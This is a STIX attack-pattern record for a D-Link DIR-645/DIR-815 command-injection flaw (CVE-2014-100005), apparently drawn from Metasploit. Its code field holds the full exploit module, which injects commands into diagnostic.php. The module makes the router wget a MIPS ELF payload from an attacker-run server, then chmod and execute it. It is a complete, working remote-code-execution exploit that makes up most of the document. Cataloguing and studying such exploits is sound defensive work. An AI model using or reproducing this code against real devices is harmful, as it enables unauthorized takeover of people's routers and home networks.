{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a6b22e00-020c-4517-8002-89563845d4a4",
    "created": "2024-08-14T17:04:04.173507Z",
    "modified": "2024-08-14T17:04:04.173511Z",
    "name": "D-Link DIR-645 / DIR-815 diagnostic.php Command Execution",
    "description": " Some D-Link Routers are vulnerable to OS Command injection in the web interface. On DIR-645 versions prior 1.03 authentication isn't needed to exploit it. On version 1.03 authentication is needed in order to trigger the vulnerability, which has been fixed definitely on version 1.04. Other D-Link products, like DIR-300 rev B and DIR-600, are also affected by this vulnerability. Not every device includes wget which we need for deploying our payload. On such devices you could use the cmd generic payload and try to start telnetd or execute other commands. Since it is a blind OS command injection vulnerability, there is no output for the executed command when using the cmd generic payload. A ping command against a controlled system could be used for testing purposes. This module has been tested successfully on DIR-645 prior to 1.03, where authentication isn't needed in order to exploit the vulnerability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dlink_diagnostic_exec_noauth.rb",
            "external_id": "dlink_diagnostic_exec_noauth.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-100005"
        },
        {
            "source_name": "reference",
            "url": "http://www.s3cur1ty.de/m1adv2013-017"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'D-Link DIR-645 / DIR-815 diagnostic.php Command Execution',\n      'Description' => %q{\n          Some D-Link Routers are vulnerable to OS Command injection in the web interface.\n        On DIR-645 versions prior 1.03 authentication isn't needed to exploit it. On\n        version 1.03 authentication is needed in order to trigger the vulnerability, which\n        has been fixed definitely on version 1.04. Other D-Link products, like DIR-300 rev B\n        and DIR-600, are also affected by this vulnerability. Not every device includes\n        wget which we need for deploying our payload. On such devices you could use the cmd\n        generic payload and try to start telnetd or execute other commands. Since it is a\n        blind OS command injection vulnerability, there is no output for the executed\n        command when using the cmd generic payload. A ping command against a controlled\n        system could be used for testing purposes. This module has been tested successfully\n        on DIR-645 prior to 1.03, where authentication isn't needed in order to exploit the\n        vulnerability.\n      },\n      'Author'      =>\n        [\n          'Michael Messner <devnull[at]s3cur1ty.de>', # Vulnerability discovery and Metasploit module\n          'juan vazquez' # minor help with msf module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2014-100005' ],\n          [ 'OSVDB', '92144' ],\n          [ 'BID', '58938' ],\n          [ 'EDB', '24926' ],\n          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-017' ]\n        ],\n      'DisclosureDate' => '2013-03-05',\n      'Privileged'     => true,\n      'Platform'       => %w{ linux unix },\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'Targets'        =>\n        [\n          [ 'CMD',\n            {\n            'Arch' => ARCH_CMD,\n            'Platform' => 'unix'\n            }\n          ],\n          [ 'Linux mipsel Payload',\n            {\n            'Arch' => ARCH_MIPSLE,\n            'Platform' => 'linux'\n            }\n          ],\n        ],\n      'DefaultTarget'  => 1\n      ))\n\n    register_options(\n      [\n        OptAddress.new('DOWNHOST', [ false, 'An alternative host to request the MIPS payload from' ]),\n        OptString.new('DOWNFILE', [ false, 'Filename to download, (default: random)' ]),\n        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the ELF payload request', 60])\n      ])\n  end\n\n\n  def request(cmd,uri)\n    begin\n      res = send_request_cgi({\n        'uri'    => uri,\n        'method' => 'POST',\n        'vars_post' => {\n          \"act\" => \"ping\",\n          \"dst\" => \"` #{cmd}`\"\n        }\n      })\n    return res\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - Failed to connect to the web server\")\n      return nil\n    end\n  end\n\n  def exploit\n    downfile = datastore['DOWNFILE'] || rand_text_alpha(8+rand(8))\n    uri = '/diagnostic.php'\n\n    if target.name =~ /CMD/\n      if not (datastore['CMD'])\n        fail_with(Failure::BadConfig, \"#{rhost}:#{rport} - Only the cmd/generic payload is compatible\")\n      end\n      cmd = payload.encoded\n      res = request(cmd,uri)\n      if (!res)\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to execute payload\")\n      end\n      print_status(\"#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state\")\n      return\n    end\n\n    #thx to Juan for his awesome work on the mipsel elf support\n    @pl = generate_payload_exe\n    @elf_sent = false\n\n    #\n    # start our server\n    #\n    resource_uri = '/' + downfile\n\n    if (datastore['DOWNHOST'])\n      service_url = 'http://' + datastore['DOWNHOST'] + ':' + datastore['SRVPORT'].to_s + resource_uri\n    else\n      #do not use SSL\n      if datastore['SSL']\n        ssl_restore = true\n        datastore['SSL'] = false\n      end\n\n      #we use SRVHOST as download IP for the coming wget command.\n      #SRVHOST needs a real IP address of our download host\n      if (datastore['SRVHOST'] == \"0.0.0.0\" or datastore['SRVHOST'] == \"::\")\n        srv_host = Rex::Socket.source_address(rhost)\n      else\n        srv_host = datastore['SRVHOST']\n      end\n\n      service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri\n\n      print_status(\"#{rhost}:#{rport} - Starting up our web service on #{service_url} ...\")\n      start_service({'Uri' => {\n        'Proc' => Proc.new { |cli, req|\n          on_request_uri(cli, req)\n        },\n        'Path' => resource_uri\n      }})\n\n      datastore['SSL'] = true if ssl_restore\n    end\n\n    #\n    # download payload\n    #\n    print_status(\"#{rhost}:#{rport} - Asking the D-Link device to download #{service_url}\")\n    #this filename is used to store the payload on the device\n    filename = rand_text_alpha_lower(8)\n\n    #not working if we send all command together -> lets take three requests\n    cmd = \"/usr/bin/wget #{service_url} -O /tmp/#{filename}\"\n    res = request(cmd,uri)\n    if (!res)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to deploy payload\")\n    end\n\n    # wait for payload download\n    if (datastore['DOWNHOST'])\n      print_status(\"#{rhost}:#{rport} - Giving #{datastore['HTTP_DELAY']} seconds to the D-Link device to download the payload\")\n      select(nil, nil, nil, datastore['HTTP_DELAY'])\n    else\n      wait_linux_payload\n    end\n    register_file_for_cleanup(\"/tmp/#{filename}\")\n\n    #\n    # chmod\n    #\n    cmd = \"chmod 777 /tmp/#{filename}\"\n    print_status(\"#{rhost}:#{rport} - Asking the D-Link device to chmod #{downfile}\")\n    res = request(cmd,uri)\n    if (!res)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to deploy payload\")\n    end\n\n    #\n    # execute\n    #\n    cmd = \"/tmp/#{filename}\"\n    print_status(\"#{rhost}:#{rport} - Asking the D-Link device to execute #{downfile}\")\n    res = request(cmd,uri)\n    if (!res)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to deploy payload\")\n    end\n\n  end\n\n  # Handle incoming requests from the server\n  def on_request_uri(cli, request)\n    #print_status(\"on_request_uri called: #{request.inspect}\")\n    if (not @pl)\n      print_error(\"#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!\")\n      return\n    end\n    print_status(\"#{rhost}:#{rport} - Sending the payload to the server...\")\n    @elf_sent = true\n    send_response(cli, @pl)\n  end\n\n  # wait for the data to be sent\n  def wait_linux_payload\n    print_status(\"#{rhost}:#{rport} - Waiting for the target to request the ELF payload...\")\n\n    waited = 0\n    while (not @elf_sent)\n      select(nil, nil, nil, 1)\n      waited += 1\n      if (waited > datastore['HTTP_DELAY'])\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Target didn't request request the ELF payload -- Maybe it can't connect back to us?\")\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-03-05",
    "x_mitre_platforms": [
        "linux"
    ]
}